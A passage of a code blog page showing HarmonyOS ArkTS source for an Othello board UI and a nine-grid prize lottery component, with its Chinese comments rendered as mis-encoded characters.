class_">Text</span>()<span class="comment">// æ˜¾ç¤ºå•å…ƒæ ¼çš„å€¼æˆ–ç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// æ–‡æœ¬å±…ä¸­</span></span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)<span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>)<span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">            .<span class="title function_">padding</span>(<span class="number">10</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">visibility</span>(!<span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">Hidden</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.cellSize + <span class="variable language_">this</span>.cellSpacing * <span class="number">2</span>) * <span class="number">8</span>&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">      .<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>)</span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">20</span> &#125;)</span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Stack</span>() &#123;</span><br><span class="line">        <span class="comment">//æ£‹ç›˜èƒŒæ™¯</span></span><br><span class="line">        <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span> &#125;) &#123;</span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>, <span class="function">(<span class="params">row: boolean[], _rowIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">ForEach</span>(row, <span class="function">(<span class="params">item: TileHighlight, _colIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;item.isValidMove ? <span class="string">&#x27;+&#x27;</span> : <span class="string">&#x27;&#x27;</span>&#125;</span>`</span>)<span class="comment">// æ˜¾ç¤ºå•å…ƒæ ¼çš„å€¼æˆ–ç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">                .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">                .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">                .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSpacing&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">                .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">                .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// æ–‡æœ¬å±…ä¸­</span></span><br><span class="line">                .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Gray</span>)<span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="number">2</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.cellSize + <span class="variable language_">this</span>.cellSpacing * <span class="number">2</span>) * <span class="number">8</span>&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">        <span class="comment">//æ£‹å­</span></span><br><span class="line">        <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span> &#125;) &#123;</span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">chessBoard</span>, <span class="function">(<span class="params">row: ChessCell[], rowIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">ForEach</span>(row, <span class="function">(<span class="params">chessCell: ChessCell, colIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">``</span>)<span class="comment">// æ˜¾ç¤ºå•å…ƒæ ¼çš„å€¼æˆ–ç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">                .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">                .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">                .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSpacing&#125;</span>lpx`</span>)<span class="comment">// è®¾ç½®è¾¹è·</span></span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">                .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// æ–‡æœ¬å±…ä¸­</span></span><br><span class="line">                .<span class="title function_">opacity</span>(chessCell.<span class="property">opacity</span>)</span><br><span class="line">                .<span class="title function_">backgroundColor</span>(chessCell.<span class="property">frontVisibility</span> != <span class="number">0</span> ?</span><br><span class="line">                  (chessCell.<span class="property">frontVisibility</span> === <span class="number">1</span> ? <span class="title class_">Color</span>.<span class="property">Black</span> : <span class="title class_">Color</span>.<span class="property">White</span>) :</span><br><span class="line">                <span class="title class_">Color</span>.<span class="property">Transparent</span>)<span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>)<span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">                .<span class="title function_">rotate</span>(&#123;</span><br><span class="line">                  <span class="comment">// è®¾ç½®æ—‹è½¬</span></span><br><span class="line">                  <span class="attr">x</span>: <span class="number">0</span>,</span><br><span class="line">                  <span class="attr">y</span>: <span class="number">1</span>,</span><br><span class="line">                  <span class="attr">z</span>: <span class="number">0</span>,</span><br><span class="line">                  <span class="attr">angle</span>: chessCell.<span class="property">rotationAngle</span>, <span class="comment">// æ—‹è½¬è§’åº¦</span></span><br><span class="line">                  <span class="attr">centerX</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>, <span class="comment">// ä¸­å¿ƒç‚¹Xåæ ‡</span></span><br><span class="line">                  <span class="attr">centerY</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>, <span class="comment">// ä¸­å¿ƒç‚¹Yåæ ‡</span></span><br><span class="line">                &#125;)</span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å•å‡»äº‹ä»¶å¤„ç†</span></span><br><span class="line">                  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAIPlaying</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`aiæ­£åœ¨è½å­ï¼Œç©å®¶ä¸å¯ç»§ç»­è½å­`</span>)</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span> (chessCell.<span class="property">frontVisibility</span> === <span class="number">0</span>) &#123; <span class="comment">// æ²¡æœ‰æ£‹å­ï¼Œéœ€è¦è½å­</span></span><br><span class="line">                    <span class="variable language_">this</span>.<span class="title function_">placeChessPiece</span>(rowIndex, colIndex, chessCell)</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.cellSize + <span class="variable language_">this</span>.cellSpacing * <span class="number">2</span>) * <span class="number">8</span>&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSpacing&#125;</span>lpx`</span>)</span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>)</span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Row</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.isTwoPlayerMode? <span class="string">&#x27;åŒäººæ¸¸æˆ&#x27;</span> : <span class="string">&#x27;å•äººæ¸¸æˆ&#x27;</span>&#125;</span>`</span>)</span><br><span class="line">          .<span class="title function_">height</span>(<span class="number">50</span>)</span><br><span class="line">          .<span class="title function_">padding</span>(&#123; <span class="attr">left</span>: <span class="number">10</span> &#125;)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">16</span>)</span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Start</span>)</span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="number">0xFFFFFF</span>)</span><br><span class="line">        <span class="title class_">Toggle</span>(&#123; <span class="attr">type</span>: <span class="title class_">ToggleType</span>.<span class="property">Switch</span>, <span class="attr">isOn</span>: <span class="variable language_">this</span>.<span class="property">isTwoPlayerMode</span> &#125;)</span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">left</span>: <span class="number">200</span>, <span class="attr">right</span>: <span class="number">10</span> &#125;)</span><br><span class="line">          .<span class="title function_">onChange</span>(<span class="function">(<span class="params">isOn: boolean</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isTwoPlayerMode</span> = isOn</span><br><span class="line">          &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="number">0xFFFFFF</span>)</span><br><span class="line">      .<span class="title function_">borderRadius</span>(<span class="number">5</span>)</span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;é‡æ–°å¼€å§‹&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// æŒ‰é’®ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">initGame</span>()</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®é«˜åº¦å’Œå®½åº¦</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Orange</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="nine-square"><a href="#nine-square" class="headerlink" title="nine-square"></a>nine-square</h1><p>ä¹å®«æ ¼æŠ½å¥–</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªå¯è§‚å¯Ÿçš„Prizeç±»ï¼Œç”¨äºè¡¨ç¤ºå¥–å“ä¿¡æ¯ã€‚</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Prize</span> &#123;</span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">title</span>: string <span class="comment">// å¥–å“æ ‡é¢˜å±æ€§ï¼Œä½¿ç”¨@Traceè¿›è¡Œè¿½è¸ªä»¥ä¾¿å“åº”å¼æ›´æ–°UI</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">color</span>: string <span class="comment">// å¥–å“é¢œè‰²å±æ€§</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">description</span>: string <span class="comment">// å¥–å“æè¿°å±æ€§</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„é€ å‡½æ•°ï¼Œç”¨æ¥åˆå§‹åŒ–æ–°çš„å¥–å“å®ä¾‹</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">title: string, color: string, description: string = <span class="string">&quot;&quot;</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">title</span> = title <span class="comment">// è®¾ç½®å¥–å“æ ‡é¢˜</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">color</span> = color <span class="comment">// è®¾ç½®å¥–å“é¢œè‰²</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">description</span> = description <span class="comment">// è®¾ç½®å¥–å“æè¿°ï¼Œé»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// å®šä¹‰MyPrizeUpdateç»“æ„ç»„ä»¶ï¼Œç”¨äºæ˜¾ç¤ºå’Œç¼–è¾‘é€‰ä¸­çš„å¥–å“ä¿¡æ¯</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">MyPrizeUpdate</span> &#123;</span><br><span class="line">  @<span class="title class_">Consume</span> <span class="attr">selectedIndex</span>: number <span class="comment">// å½“å‰é€‰ä¸­çš„å¥–å“ç´¢å¼•</span></span><br><span class="line">  @<span class="title class_">Consume</span> private <span class="attr">selectionOrder</span>: number[] <span class="comment">// ä¿å­˜æŠ½å¥–é¡ºåºçš„æ•°ç»„</span></span><br><span class="line">  @<span class="title class_">Consume</span> private <span class="attr">prizeArray</span>: <span class="title class_">Prize</span>[] <span class="comment">// ä¿å­˜æ‰€æœ‰å¥–å“çš„æ•°ç»„</span></span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123; <span class="comment">// åˆ›å»ºåˆ—å¸ƒå±€å®¹å™¨ï¼Œè®¾ç½®å­å…ƒç´ ä¹‹é—´çš„é—´è·ä¸º20px</span></span><br><span class="line">      <span class="title class_">Row</span>() &#123; <span class="comment">// åˆ›å»ºè¡Œå¸ƒå±€å®¹å™¨</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;æ ‡é¢˜ï¼š&#x27;</span>) <span class="comment">// æ˜¾ç¤ºâ€œæ ‡é¢˜â€æ–‡æœ¬</span></span><br><span class="line">        <span class="title class_">TextInput</span>(&#123; <span class="attr">text</span>: <span class="variable language_">this</span>.<span class="property">prizeArray</span>[<span class="variable language_">this</span>.<span class="property">selectionOrder</span>[<span class="variable language_">this</span>.<span class="property">selectedIndex</span>%<span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span>]].<span class="property">title</span> &#125;)</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;300lpx&#x27;</span>) <span class="comment">// è®¾ç½®è¾“å…¥æ¡†å®½åº¦</span></span><br><span class="line">          .<span class="title function_">onChange</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123; <span class="comment">// ç›‘å¬è¾“å…¥æ¡†å†…å®¹å˜åŒ–</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">prizeArray</span>[<span class="variable language_">this</span>.<span class="property">selectionOrder</span>[<span class="variable language_">this</span>.<span class="property">selectedIndex</span>%<span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span>]].<span class="property">title</span> = value <span class="comment">// æ›´æ–°å¥–å“æ ‡é¢˜</span></span><br><span class="line">          &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title class_">Row</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;æè¿°ï¼š&#x27;</span>)</span><br><span class="line">        <span class="title class_">TextInput</span>(&#123;</span><br><span class="line">          <span class="attr">text</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.prizeArray[<span class="variable language_">this</span>.selectionOrder[<span class="variable language_">this</span>.selectedIndex%<span class="variable language_">this</span>.selectionOrder.length]].description&#125;</span>`</span></span><br><span class="line">        &#125;).<span class="title function_">width</span>(<span class="string">&#x27;300lpx&#x27;</span>).<span class="title function_">onChange</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123; <span class="comment">// åŒä¸Šï¼Œä½†é’ˆå¯¹å¥–å“æè¿°</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">prizeArray</span>[<span class="variable language_">this</span>.<span class="property">selectionOrder</span>[<span class="variable language_">this</span>.<span class="property">selectedIndex</span>%<span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span>]].<span class="property">description</span> = value</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title class_">Row</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;é¢œè‰²ï¼š&#x27;</span>)</span><br><span class="line">        <span class="title class_">TextInput</span>(&#123;</span><br><span class="line">          <span class="attr">text</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.prizeArray[<span class="variable language_">this</span>.selectionOrder[<span class="variable language_">this</span>.selectedIndex%<span class="variable language_">this</span>.selectionOrder.length]].color&#125;</span>`</span></span><br><span class="line">        &#125;).<span class="title function_">width</span>(<span class="string">&#x27;300lpx&#x27;</span>).<span class="title function_">onChange</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123; <span class="comment">// åŒä¸Šï¼Œä½†é’ˆå¯¹å¥–å“é¢œè‰²</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">prizeArray</span>[<span class="variable language_">this</span>.<span class="property">selectionOrder</span>[<span class="variable language_">this</span>.<span class="property">selectedIndex</span>%<span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span>]].<span class="property">color</span> = value</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">Start</span>) <span class="comment">// è®¾ç½®å†…å®¹å·¦å¯¹é½</span></span><br><span class="line">    .<span class="title function_">padding</span>(<span class="number">40</span>) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®å®½åº¦ä¸º100%</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²ä¸ºç™½è‰²</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// å®šä¹‰æŠ½å¥–é¡µé¢å…¥å£ç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">LotteryPage</span> &#123;</span><br><span class="line">  @<span class="title class_">Provide</span> private <span class="attr">selectedIndex</span>: number = <span class="number">0</span> <span class="comment">// æä¾›å½“å‰é€‰ä¸­çš„ç´¢å¼•ï¼Œåˆå§‹å€¼ä¸º0</span></span><br><span class="line">  private <span class="attr">isAnimating</span>: boolean = <span class="literal">false</span> <span class="comment">// æ ‡è®°æ˜¯å¦æ­£åœ¨è¿›è¡ŒåŠ¨ç”»ï¼Œåˆå§‹å€¼ä¸ºfalse</span></span><br><span class="line">  @<span class="title class_">Provide</span> private <span class="attr">selectionOrder</span>: number[] = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">3</span>] <span class="comment">// å®šä¹‰æŠ½å¥–é¡ºåº</span></span><br><span class="line">  private <span class="attr">cellWidth</span>: number = <span class="number">200</span> <span class="comment">// å•å…ƒæ ¼å®½åº¦</span></span><br><span class="line">  private <span class="attr">baseMargin</span>: number = <span class="number">10</span> <span class="comment">// å•å…ƒæ ¼è¾¹è·</span></span><br><span class="line">  @<span class="title class_">Provide</span> private <span class="attr">prizeArray</span>: <span class="title class_">Prize</span>[] = [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;çº¢åŒ…&quot;</span>, <span class="string">&quot;#ff9675&quot;</span>, <span class="string">&quot;10å…ƒ&quot;</span>), <span class="comment">// åˆå§‹åŒ–å¥–å“æ•°ç»„ï¼Œåˆ›å»ºå„ç§å¥–å“å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;è¯è´¹&quot;</span>, <span class="string">&quot;#ff9f2e&quot;</span>, <span class="string">&quot;5å…ƒ&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;çº¢åŒ…&quot;</span>, <span class="string">&quot;#8e7fff&quot;</span>, <span class="string">&quot;50å…ƒ&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;çº¢åŒ…&quot;</span>, <span class="string">&quot;#48d1ea&quot;</span>, <span class="string">&quot;30å…ƒ&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;å¼€å§‹æŠ½å¥–&quot;</span>, <span class="string">&quot;#fffdfd&quot;</span>), <span class="comment">// æŠ½å¥–æŒ‰é’®ï¼Œæ²¡æœ‰å…·ä½“å¥–å“æè¿°</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;è°¢è°¢å‚ä¸&quot;</span>, <span class="string">&quot;#5f5f5f&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;è°¢è°¢å‚ä¸&quot;</span>, <span class="string">&quot;#5f5f5f&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;è¶…å¸‚çº¢åŒ…&quot;</span>, <span class="string">&quot;#5f5f5f&quot;</span>, <span class="string">&quot;100å…ƒ&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;é²œèŠ±&quot;</span>, <span class="string">&quot;#75b0fe&quot;</span>),</span><br><span class="line">  ]</span><br><span class="line">  private <span class="attr">intervalID</span>: number = <span class="number">0</span> <span class="comment">// å®šæ—¶å™¨IDï¼Œç”¨äºæ§åˆ¶æŠ½å¥–é€Ÿåº¦</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isSheetVisible</span>: boolean = <span class="literal">false</span> <span class="comment">// æ§åˆ¶åº•éƒ¨å¼¹å‡ºè¡¨å•çš„å¯è§æ€§</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å¼€å§‹æŠ½å¥–é€»è¾‘</span></span><br><span class="line">  <span class="title function_">startLottery</span>(<span class="params">speed: number = <span class="number">500</span></span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// è®¾ç½®å»¶æ—¶æ‰§è¡Œ</span></span><br><span class="line">      <span class="keyword">if</span> (speed &gt; <span class="number">50</span>) &#123; <span class="comment">// å¦‚æœé€Ÿåº¦å¤§äº50ï¼Œåˆ™é€’å½’è°ƒç”¨startLotteryä»¥é€æ¸åŠ é€Ÿ</span></span><br><span class="line">        speed -= <span class="number">50</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">startLottery</span>(speed)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">runAtConstantSpeed</span>() <span class="comment">// 